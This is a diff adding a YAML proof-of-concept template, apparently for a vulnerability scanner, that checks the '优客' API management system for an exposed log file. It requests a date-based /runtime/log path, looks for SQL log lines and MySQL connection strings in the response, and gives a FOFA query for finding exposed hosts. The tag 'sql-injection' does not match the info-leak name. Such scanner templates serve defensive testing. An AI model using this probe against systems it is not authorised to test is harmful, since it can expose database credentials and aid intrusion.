@@ -1,0 +1,18 @@
+id: poc-yaml-youke-api-management-system-log-info-leak
+info:
+  name: 全新优客API接口管理系统 log 信息泄露漏洞
+  severity: medium
+  tags:
+  - sql-injection
+  finger: 优客API接口管理系统
+  fofa: body="public/static/index/css/flaghome.css"
+variables:
+  dt1: datetime("2006")
+  dt2: datetime("01")
+  dt3: datetime("02")
+requests:
+- method: GET
+  path: /runtime/log/{{.dt1}}{{.dt2}}/{{.dt3}}.log
+  expression: status_code == 200 && contains(body,"[ sql ]") && contains(body,"mysql:host")
+    && contains(body,"dbname=") && contains(content_type,"application/octet-stream")
+transport: http
